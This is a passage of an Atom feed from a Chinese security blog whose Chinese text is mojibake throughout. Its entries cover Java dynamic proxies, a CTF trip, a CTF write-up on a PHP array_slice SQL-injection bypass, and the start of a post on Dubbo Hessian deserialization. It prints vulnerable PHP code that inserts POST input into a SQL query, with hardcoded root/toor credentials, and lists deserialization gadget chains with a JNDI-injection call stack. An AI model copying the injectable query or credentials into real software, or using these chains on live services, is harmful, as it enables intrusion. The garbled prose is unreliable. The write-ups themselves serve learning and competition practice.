    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ä¹ ä¸€ä¸‹JavaåŠ¨æ€ä»£ç†ã€‚</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>ä¸ºå•¥è¦ç”¨åŠ¨æ€ä»£ç†ï¼Ÿ</p><p>æˆ‘è§‰å¾—æˆ‘ä»¬ä¸èƒ½ä»Whatå¼€å§‹å­¦ï¼Œç›´æ¥å­¦å•¥æ˜¯åŠ¨æ€ä»£ç†ç›´æ¥èƒ½ç›´æ¥ç»™äººçœ‹æ‡µé€¼ã€‚</p><p>æˆ‘ä»¬ä»Whyçš„è§’åº¦å¼€å§‹å­¦ï¼Œä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€ä»£ç†ï¼Ÿ</p><p>åŠ¨æ€ä»£ç†å…¶å®å°±æ˜¯ä¸€ä¸ªåŠ¨æ€ç”Ÿæˆå­ç±»çš„æ–¹æ³•ï¼Œçœ‹èµ·æ¥å†™å‡ºæ¥ä¸€å †ä¸œè¥¿ï¼Œä½†æ˜¯é’ˆå¯¹Javaè¿™ä¸ªé™æ€è¯­è¨€ï¼Œå´æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚</p><p>è¯•æƒ³ï¼Œä½ æœ‰ä¸€ä¸ªå¤§çš„Javaé¡¹ç›®ï¼Œç°åœ¨ä½ æƒ³æ”¹åŠ¨ä¸€ä¸ªç±»ä¸­çš„æŸä¸ªæ–¹æ³•ï¼Œå¦‚æœä¸ä½¿ç”¨åŠ¨æ€ä»£ç†çš„æ–¹å¼ï¼Œé‚£ä½ å°±ä¼šé¢ä¸´ä¸€ä¸ªå›°å¢ƒâ€“ä½ éœ€è¦æŠŠæºæ–‡ä»¶ä¿®æ”¹äº†ï¼Œç„¶åå†æ‹¿å»ç¼–è¯‘ã€è¿è¡Œï¼Œç”šè‡³æœ‰äº›åœ°æ–¹å¼•ç”¨äº†è¿™ä¸ªæ–¹æ³•ä½†ä¸å¸Œæœ›æ›´æ”¹ä¹Ÿéœ€è¦é‡æ–°è®¾ä¸€ä¸ªå†æ”¹å›å»ã€‚</p><p>ä½†æ˜¯å¦‚æœä½ ä½¿ç”¨äº†åŠ¨æ€ä»£ç†ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œä½ å°±ç›´æ¥å¯ä»¥åœ¨ä¸é‡æ–°ç¼–è¯‘çš„æƒ…å†µä¸‹ç›´æ¥æ›´æ”¹ç±»ä¸­çš„æ–¹æ³•ç„¶ååº”ç”¨åˆ°å½“å‰æ¨¡å—ä¸­ï¼Œè¿™å¯¹äºæ•´ä¸ªé¡¹ç›®æ¥è¯´æ•ˆç‡éƒ½æ˜¯éå¸¸é«˜çš„ï¼Œè€Œä¸”å¯å˜æ€§å¯å»¶å±•æ€§éƒ½éå¸¸å¼ºå¤§ã€‚é…åˆåå°„çš„æ—¶å€™ï¼Œå¾€å¾€ä½ åªéœ€è¦æ›´æ”¹ä¸€ä¸‹ç±»çš„è¾“å…¥æˆ–è€…é…ç½®æ–‡ä»¶å°±èƒ½ä¸€æ­¥åˆ°ä½ã€‚</p><p>è¿™é‡Œå¯ä»¥ä¸¾ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜åŠ¨æ€ä»£ç†çš„å®ç°ï¼š</p><p><strong>å°±å¥½æ¯”ä½ å»ºäº†ä¸€æ ‹æˆ¿å­ï¼Œä½†æ˜¯ä½ éœ€è¦æŠŠä½ æœ€åº•ä¸‹çš„æŸä¸ªç –å¤´æ¢äº†ï¼Œå¦‚æœæ²¡ç”¨åŠ¨æ€ä»£ç†ï¼Œä½ å°±å¿…é¡»æŠŠä½ çš„æˆ¿å­æ€äº†å†å»æ‰¾åˆ°è¿™ä¸ªç –å¤´ç„¶åæ›´æ¢ã€‚ä½†ä½¿ç”¨äº†åŠ¨æ€ä»£ç†åï¼Œå°±ç›¸å½“äºå®ƒèƒ½è‡ªåŠ¨å¸®ä½ ç”Ÿæˆç¬¦åˆä½ éœ€æ±‚çš„å®Œç¾ç –å¤´å¹¶åº”ç”¨æˆåŠŸï¼Œæ ¹æœ¬å°±ä¸éœ€è¦ä½ æ€äº†æ•´ä¸ªæˆ¿å­ã€‚</strong></p><p>è¿™é‡Œç›´æ¥å¼•å…¥Proxyã€‚</p><p>Proxy æ˜¯è®¾è®¡æ¨¡å¼ä¸­çš„ä¸€ç§ã€‚å½“éœ€è¦åœ¨å·²å­˜åœ¨çš„ class ä¸Šæ·»åŠ æˆ–ä¿®æ”¹åŠŸèƒ½æ—¶ï¼Œå¯ä»¥é€šè¿‡åˆ›å»º proxy object æ¥å®ç°</p><p>é€šå¸¸ proxy object å’Œè¢«ä»£ç†å¯¹è±¡æ‹¥æœ‰ç›¸åŒçš„æ–¹æ³•ï¼Œå¹¶ä¸”æ‹¥æœ‰è¢«ä»£ç†å¯¹è±¡çš„å¼•ç”¨ï¼Œå¯ä»¥è°ƒç”¨å…¶æ–¹æ³•ã€‚</p><p>ä»£ç†æ¨¡å¼<a href="https://javax0.wordpress.com/2016/01/20/java-dynamic-proxy">åº”ç”¨åœºæ™¯</a>åŒ…æ‹¬</p><ul><li>åœ¨æ–¹æ³•æ‰§è¡Œå‰åæ‰“å°å’Œè®°å½•æ—¥å¿—</li><li>è®¤è¯ã€å‚æ•°æ£€æŸ¥</li><li>lazy instantiation (Hibernate, Mybatis)</li><li>AOP (transaction)</li><li>mocking</li><li>â€¦</li></ul><p>ä»£ç†æœ‰ä¸¤ç§å®ç°æ–¹å¼</p><ul><li>é™æ€ä»£ç†ï¼šåœ¨ç¼–è¯‘æ—¶æœŸï¼Œåˆ›å»ºä»£ç†å¯¹è±¡</li><li>åŠ¨æ€ä»£ç†ï¼šåœ¨è¿è¡Œæ—¶æœŸï¼ŒåŠ¨æ€åˆ›å»º</li></ul><p>å¯¹äºé‡å¤æ€§å·¥ä½œï¼Œå¦‚æ‰“å°æ—¥å¿—ï¼Œé™æ€ä»£ç†éœ€è¦ä¸ºæ¯ä¸ª class éƒ½åˆ›å»º proxy classï¼Œè¿‡ç¨‹ç¹çå’Œä½æ•ˆï¼Œè€ŒåŠ¨æ€ä»£ç†é€šè¿‡ä½¿ç”¨åå°„åœ¨è¿è¡Œæ—¶ç”Ÿæˆ bytecode çš„æ–¹å¼æ¥å®ç°ï¼Œæ›´åŠ æ–¹ä¾¿å’Œå¼ºå¤§</p><p>åç»­å¯çœ‹<a href="https://b1ngz.github.io/java-dynamic-proxy/">Java Dynamic Proxy | b1ngz</a>ï¼Œæ€»ç»“çš„å¾ˆä¸é”™ï¼Œæˆ‘å°±ä¸å†èµ˜è¿°äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¾ŠåŸæ¯Final-å°è®°</title>
    <link href="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/"/>
    <url>/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æœ¬ç§‘ç»„ç¬¬äºŒï¼</p><p>ï¼ˆç¬¬ä¸€æ˜¯æˆ‘ä»¬å¤©æ¢å­¦é•¿ï¼Œtqlï¼Œç›´æ¥æŠŠé¶åœºæ‰“ç©¿akäº†ï¼‰</p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143449487.png" alt="image-20240915143449487"></p><p>ï¼ˆè¿™é‡Œä¸å¾—ä¸æä¸€ä¸ª7æœˆä»½çš„sbæ¯”èµ›ï¼Œæˆ‘ä»¬æ‰“åˆ°å…¨å›½æ€»å† å†›éƒ½ä¸ç»™å¥–é‡‘å’Œå¥–æ¯ï¼Œä¸»åŠæ–¹è¿˜è£…æ­»â€¦â€¦ï¼‰</p><p>æˆ‘ä¸æ‰“ç®—è®°finalæ€ä¹ˆæ‰“çš„ï¼Œä½†ä¹Ÿç¡®å®ä¸å¥½è®°ï¼Œå¤šç½‘å¡è·³æ¥è·³å»çš„ï¼Œä¹Ÿæ²¡å’‹è®°å½•ï¼Œæœ‰ç‚¹éš¾ç»·â€¦â€¦</p><p>æ‰€ä»¥è®°ä¸€ä¸‹å¹¿å·ä¹‹æ—…å§~~</p><h2 id="ä¸Šé£æœºå–½"><a href="#ä¸Šé£æœºå–½" class="headerlink" title="ä¸Šé£æœºå–½"></a>ä¸Šé£æœºå–½</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143510190.png" alt="image-20240915143510190"></p><h2 id="å¤©æ°”å¾ˆå¥½"><a href="#å¤©æ°”å¾ˆå¥½" class="headerlink" title="å¤©æ°”å¾ˆå¥½"></a>å¤©æ°”å¾ˆå¥½</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143525788.png" alt="image-20240915143525788"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143539210.png" alt="image-20240915143539210"></p><h2 id="ä¸‹é¢èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼Œå¤©æ¢æ¸—é€çœŸç¥F4ï¼ˆå·æ‹å­¦é•¿èƒŒå½±ï¼‰ï¼š"><a href="#ä¸‹é¢èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼Œå¤©æ¢æ¸—é€çœŸç¥F4ï¼ˆå·æ‹å­¦é•¿èƒŒå½±ï¼‰ï¼š" class="headerlink" title="ä¸‹é¢èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼Œå¤©æ¢æ¸—é€çœŸç¥F4ï¼ˆå·æ‹å­¦é•¿èƒŒå½±ï¼‰ï¼š"></a>ä¸‹é¢èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼Œå¤©æ¢æ¸—é€çœŸç¥F4ï¼ˆå·æ‹å­¦é•¿èƒŒå½±ï¼‰ï¼š</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143555579.png" alt="image-20240915143555579"></p><h2 id="æ¯”èµ›ç°åœºå¥½æ°”æ´¾ï¼ˆæ¯”æŸä¸ª7æœˆå‚åŠ çš„sbæ¯”èµ›å¥½å¤ªå¤šäº†ï¼‰"><a href="#æ¯”èµ›ç°åœºå¥½æ°”æ´¾ï¼ˆæ¯”æŸä¸ª7æœˆå‚åŠ çš„sbæ¯”èµ›å¥½å¤ªå¤šäº†ï¼‰" class="headerlink" title="æ¯”èµ›ç°åœºå¥½æ°”æ´¾ï¼ˆæ¯”æŸä¸ª7æœˆå‚åŠ çš„sbæ¯”èµ›å¥½å¤ªå¤šäº†ï¼‰"></a>æ¯”èµ›ç°åœºå¥½æ°”æ´¾ï¼ˆæ¯”æŸä¸ª7æœˆå‚åŠ çš„sbæ¯”èµ›å¥½å¤ªå¤šäº†ï¼‰</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143645219.png" alt="image-20240915143645219"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143706815.png" alt="image-20240915143706815"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143712249.png" alt="image-20240915143712249"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143717455.png" alt="image-20240915143717455"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143724555.png" alt="image-20240915143724555"></p><h2 id="å‚èµ›å‚èµ›"><a href="#å‚èµ›å‚èµ›" class="headerlink" title="å‚èµ›å‚èµ›"></a>å‚èµ›å‚èµ›</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143800698.png" alt="image-20240915143800698"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143805958.png" alt="image-20240915143805958"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143811289.png" alt="image-20240915143811289"></p><h2 id="å…‰è£ä¸‹æ’­"><a href="#å…‰è£ä¸‹æ’­" class="headerlink" title="å…‰è£ä¸‹æ’­"></a>å…‰è£ä¸‹æ’­</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143820614.png" alt="image-20240915143820614"></p><h2 id="ä¸Šæ–°é—»ï¼ï¼ï¼"><a href="#ä¸Šæ–°é—»ï¼ï¼ï¼" class="headerlink" title="ä¸Šæ–°é—»ï¼ï¼ï¼"></a>ä¸Šæ–°é—»ï¼ï¼ï¼</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143832223.png" alt="image-20240915143832223"></p><h2 id="åŒ—äº¬ä¸Šç©º"><a href="#åŒ—äº¬ä¸Šç©º" class="headerlink" title="åŒ—äº¬ä¸Šç©º"></a>åŒ—äº¬ä¸Šç©º</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143852287.png" alt="image-20240915143852287"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143856062.png" alt="image-20240915143856062"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143900232.png" alt="image-20240915143900232"></p><h2 id="æ•…äº‹è¿˜åœ¨ç»­å†™ï¼Œä¸–ç•Œç»ˆå°†èšç„¦äºä½ æˆ‘"><a href="#æ•…äº‹è¿˜åœ¨ç»­å†™ï¼Œä¸–ç•Œç»ˆå°†èšç„¦äºä½ æˆ‘" class="headerlink" title="æ•…äº‹è¿˜åœ¨ç»­å†™ï¼Œä¸–ç•Œç»ˆå°†èšç„¦äºä½ æˆ‘"></a>æ•…äº‹è¿˜åœ¨ç»­å†™ï¼Œä¸–ç•Œç»ˆå°†èšç„¦äºä½ æˆ‘</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143928869.png" alt="image-20240915143928869"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>äº¬æ´¥å†€æ”»é˜²-array_sliceç»•è¿‡</title>
    <link href="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/"/>
    <url>/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¢˜ç›®ä¸éš¾ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆæˆ‘è¦å†™è¿™ä¹ˆä¸€ä¸ªå°æ¯”èµ›ï¼Œå› ä¸ºæˆ‘çˆ†é›¶äº†ã€‚</p><p>å¯¹ï¼Œè‡´æ•¬ä¼ å¥‡çˆ†é›¶webæ‰‹<strong>EddieMurphy</strong>ã€‚</p><p>è·¯è¿˜å¾ˆé•¿ï¼Œç¡®å®è¿˜å¾ˆé•¿ã€‚</p><h2 id="æµ…æ"><a href="#æµ…æ" class="headerlink" title="æµ…æ"></a>æµ…æ</h2><p>å‰é¢çš„ç»•è¿‡å¾ˆç®€å•ï¼Œdataä¼ªåè®®å°±èƒ½è¿›ï¼Œphpä¼ªåè®®å°±èƒ½è¯»<code>sql_unlimited.php</code>ï¼Œç„¶åæ˜¯å°±æ˜¯è¿™ä¸ªæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;toor&quot;</span>,<span class="hljs-string">&quot;unlimited&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())&#123;<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;connecte failed%s&lt;br&gt;&quot;</span>,<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_sel</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>))&#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;mysqli&#x27;</span>]-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from info where id in (<span class="hljs-subst">$id</span>)&quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-keyword">list</span>(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$message</span>)=<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;Ã¯Â¼Âš&#x27;</span>.<span class="hljs-variable">$message</span>.<span class="hljs-string">&#x27;&lt;/li&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br>    <br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_co</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$post</span>=<span class="hljs-variable">$_POST</span>;<br>    <span class="hljs-keyword">if</span> (@!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-number">0</span>]) || @!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO! NO! NO! The Parameters must be numeric&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">sql_sel</span>(<span class="hljs-title function_ invoke__">array_slice</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-number">0</span>,<span class="hljs-number">2</span>));<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No Permissions&#x27;</span>);   <br>    <br>&#125;<br><span class="hljs-title function_ invoke__">do_co</span>();<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹å‚»å‚»çš„æˆ‘è¿˜ä»¥ä¸ºç›´æ¥æ‰“åå…­è¿›åˆ¶ï¼Œä½†æ˜¯ç¡®å®æœ¬åœ°æ‰“ä¸é€šï¼Œé»”é©´æŠ€ç©·ã€‚</p><p>å’Œèµµå“¥ä¸€ç›´äº¤æµä¹Ÿæ˜¯ï¼Œæ²¡æœ‰ä»€ä¹ˆcluesï¼Œä»¥åŠé‚£é“tomcatçš„ç¼–ç ä¸Šä¼ ä¹Ÿæ˜¯ï¼Œæ²¡æœ‰è¿‡å¤šæ¥è§¦è¿™äº›é¢˜ä¹Ÿè®©æˆ‘ç–²äºåº”ä»˜ã€‚</p><p>ä½†æ˜¯SEå­¦é•¿ä¸€è¯­é“ç ´ï¼ˆtqlï¼Œè¿™æ‰æ˜¯çœŸæ­£çš„èµ›æ£ï¼‰ï¼Œç›´æ¥çœ‹åˆ°æºç çš„<code>array_slice()</code>ï¼Œæ¥è‡ªï¼š<a href="https://xz.aliyun.com/t/2087">https://xz.aliyun.com/t/2087</a>:</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003559993.png" alt="image-20240908003559993"></p><p>ç»“æŸäº†ï¼Œä¸€åˆ‡éƒ½ç»“æŸäº†ã€‚</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003056564.png" alt="image-20240908003056564"></p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003638173.png" alt="image-20240908003638173"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä½†æ˜¯ï¼Œæ™šäº†ã€‚</p><p>é˜Ÿå‹æŠŠå…¶ä»–æ–¹å‘AKåˆå¦‚ä½•ï¼Œä½ çš„webçˆ†é›¶äº†ã€‚</p><p>æ’åç¬¬ä¸€åˆå¦‚ä½•ï¼Œå› ä¸ºè·Ÿä½ æ— å…³ã€‚</p><p>æ™šä¸Šå‡ºå»drinkäº†ç‚¹ğŸºï¼Œç‹¬è‡ªéª‘è¡Œåœ¨å›æ¥çš„è·¯ä¸Šï¼Œè·¯çœŸçš„å¾ˆé•¿ã€‚</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003742077.png" alt="image-20240908003742077"></p><p><strong>èœ€é“éš¾ï¼Œéš¾äºä¸Šé’å¤©ã€‚</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dubbo</title>
    <link href="/2024/09/02/Dubbo/"/>
    <url>/2024/09/02/Dubbo/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¶ç€è¿˜æ²¡å•¥æ¯”èµ›ï¼Œå°å­¦æœŸç­‰ç»„é•¿å›å¤ï¼Œçœ‹çœ‹Dubboååºåˆ—åŒ–ã€‚</p><p>ä½†æ˜¯Dubboååºåˆ—åŒ–æ ¹æ®ç‰ˆæœ¬ä¸åŒï¼ŒPOCä¹ŸæŒºå¤šçš„ï¼Œè€Œä¸”å…‰è¿™ä¸ªDubboåè®®å­¦èµ·æ¥å°±æœ‰ä¸€ç‚¹éš¾ç»·ã€‚</p><p>å…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯Dubboï¼š</p><p>Apache Dubboæ˜¯ä¸€æ¬¾é˜¿é‡Œå·´å·´å¼€æºçš„è½»é‡ã€é«˜æ€§èƒ½çš„Java RPCæ¡†æ¶</p><p>éšç€å¾®æœåŠ¡çš„ç››è¡Œï¼Œé™¤å¼€æœåŠ¡è°ƒç”¨ä¹‹å¤–ï¼ŒDubboä¹Ÿé€æ¸æ¶‰çŒæœåŠ¡æ²»ç†ã€æœåŠ¡ç›‘æ§ã€æœåŠ¡ç½‘å…³ç­‰ï¼Œå¾€Spring Cloudé æ‹¢ã€‚</p><p>Dubbo RPCæ”¯æŒå¤šç§åºåˆ—åŒ–æ–¹å¼ï¼šdubboã€hessian2ã€kryoã€fastjsonã€javaç­‰ã€‚</p><p><img src="/2024/09/02/Dubbo/image-20240902162941056.png" alt="image-20240902162941056"></p><p><img src="/2024/09/02/Dubbo/image-20240902163349526.png" alt="image-20240902163349526"></p><p>Dubboçš„æ­å»ºå°±å…äº†ï¼Œç½‘ä¸Šæœ‰å¤ªå¤šå¤ªå¤šï¼Œè·Ÿç€æ­å°±è¡Œäº†ã€‚</p><p><a href="https://github.com/apache/dubbo-samples">https://github.com/apache/dubbo-samples</a></p><p>ä½¿ç”¨DubboæœåŠ¡éœ€è¦æœ‰ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒzookeeper</p><p><a href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p><h2 id="Dubbo-Attack"><a href="#Dubbo-Attack" class="headerlink" title="Dubbo-Attack"></a>Dubbo-Attack</h2><h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><h4 id=""><a href="#" class="headerlink" title="&lt;&#x3D;2.7.6"></a>&lt;&#x3D;2.7.6</h4><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>å½±å“èŒƒå›´ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">2.7</span><span class="hljs-number">.0</span> &lt;= Dubbo Version &lt;= <span class="hljs-number">2.7</span><span class="hljs-number">.6</span><br><span class="hljs-number">2.6</span><span class="hljs-number">.0</span> &lt;= Dubbo Version &lt;= <span class="hljs-number">2.6</span><span class="hljs-number">.7</span><br>Dubbo æ‰€æœ‰ <span class="hljs-number">2.5</span>.x ç‰ˆæœ¬ï¼ˆå®˜æ–¹å›¢é˜Ÿç›®å‰å·²ä¸æ”¯æŒï¼‰<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯å› ä¸ºdubboé»˜è®¤é€šè¿‡hessianåè®®è¿›è¡Œååºåˆ—åŒ–é€ æˆçš„æ¼æ´ï¼Œç¯å¢ƒå¯çœ‹ï¼š</p><p><a href="https://github.com/apache/dubbo-spring-boot-project">https://github.com/apache/dubbo-spring-boot-project</a></p><p>å¯ä»¥åœ¨pom.xmlä¸­æ¡ä»¶åˆ©ç”¨ä¾èµ–ï¼Œæœ‰æœ‰å¾ˆå¤šåˆ©ç”¨é“¾ï¼Œæ ¹æ®æœ‰ä»€ä¹ˆä¾èµ–æ‰“ä»€ä¹ˆé“¾ã€‚</p><p>æ¯”å¦‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">SpringPartiallyComparableAdvisorHolder<br>SpringAbstractBeanFactoryPointcutAdvisor<br>Rome<br>ROME+CC<br>Groovy<br></code></pre></td></tr></table></figure><p>ç­‰ç­‰ã€‚</p><p>ä»¥JNDIæ³¨å…¥æ‰“ROME+CCä¸ºä¾‹ï¼š</p><p>è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl 